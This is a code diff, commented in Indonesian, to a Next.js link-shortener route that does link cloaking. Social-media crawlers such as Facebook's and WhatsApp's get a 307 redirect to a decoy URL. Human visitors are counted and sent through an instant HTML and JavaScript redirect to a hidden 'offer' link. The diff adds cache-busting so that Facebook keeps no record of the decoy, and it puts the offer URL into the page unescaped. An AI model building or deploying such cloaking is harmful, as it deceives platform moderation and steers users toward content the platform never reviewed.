@@ -9,10 +9,10 @@ export async function GET(request, { params }) {
     const resolvedParams = await params;
     const shortcode = resolvedParams.shortcode;
 
-    // 1. Baca identitas
+    // 1. Baca identitas (User-Agent)
     const userAgent = request.headers.get('user-agent') || '';
 
-    // 2. Deteksi Bot Sosial Media
+    // 2. Deteksi Bot Sosial Media MURNI (Scraper)
     const isBot = /facebookexternalhit|whatsapp|telegrambot|twitterbot|googlebot|bingbot|slurp|spider/i.test(userAgent);
 
     // 3. Cari data link
@@ -28,22 +28,35 @@ export async function GET(request, { params }) {
     const data = result.rows[0];
 
     // ==========================================
-    // LOGIKA CLOAKING (BOT VS MANUSIA)
+    // SENJATA ANTI-CACHE (Angka Acak)
+    // ==========================================
+    const randomNum = Math.floor(Math.random() * 10000000);
+
+    const noCacheHeaders = {
+      'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0',
+      'Pragma': 'no-cache',
+      'Expires': '0',
+    };
+
+    // ==========================================
+    // LOGIKA CLOAKING FINAL
     // ==========================================
 
     if (isBot) {
-      // BOT FB -> Lempar pake jalur belakang (Server Redirect 302)
-      // Bot FB butuh ini biar thumbnail & judul Youtube kebaca sempurna
+      // BOT FB -> Lempar pakai 307 + Cache Buster (Biar FB gak nyimpen jejak)
       let fakeUrl = data.fake_link || 'google.com'; 
       if (!fakeUrl.startsWith('http')) fakeUrl = 'https://' + fakeUrl;
       
+      const separator = fakeUrl.includes('?') ? '&' : '?';
+      fakeUrl = `${fakeUrl}${separator}cb=${randomNum}`;
+      
       return NextResponse.redirect(new URL(fakeUrl), { 
-        status: 302, 
-        headers: { 'Cache-Control': 'no-store' } 
+        status: 307, // KUNCI MUTLAK BIAR FB GAK NYIMPEN URL FAKE
+        headers: noCacheHeaders 
       });
       
     } else {
-      // MANUSIA (FB Biru, FB Lite, dll) -> Hitung Klik
+      // MANUSIA (FB Biru, FB Lite, dll) -> JS Redirect (Biar gak blank hitam)
       await turso.execute({
         sql: "UPDATE links SET click_count = click_count + 1 WHERE short_code = ?",
         args: [shortcode]
@@ -52,15 +65,18 @@ export async function GET(request, { params }) {
       let offerUrl = data.offer_link || 'google.com';
       if (!offerUrl.startsWith('http')) offerUrl = 'https://' + offerUrl;
       
-      // JURUS ANTI BLACK-SCREEN FB BIRU: JS REDIRECT
-      // Kita gak pake NextResponse.redirect(). Kita kasih halaman HTML super ringan
-      // yang otomatis pindah sendiri dalam 0.001 detik.
+      const separator = offerUrl.includes('?') ? '&' : '?';
+      offerUrl = `${offerUrl}${separator}cb=${randomNum}`;
+      
+      // Halaman putih super ringan yang langsung pindah dalam hitungan milidetik
       const html = `
         <!DOCTYPE html>
         <html>
           <head>
             <meta charset="utf-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
             <meta http-equiv="refresh" content="0;url=${offerUrl}">
+            <title>Loading...</title>
             <script>
               window.location.replace("${offerUrl}");
             </script>
@@ -70,10 +86,10 @@ export async function GET(request, { params }) {
       `;
 
       return new NextResponse(html, {
-        status: 200,
+        status: 200, // FB mengira ini halaman biasa jadi gak bakal nge-blank
         headers: {
           'Content-Type': 'text/html',
-          'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0',
+          ...noCacheHeaders
         },
       });
     }
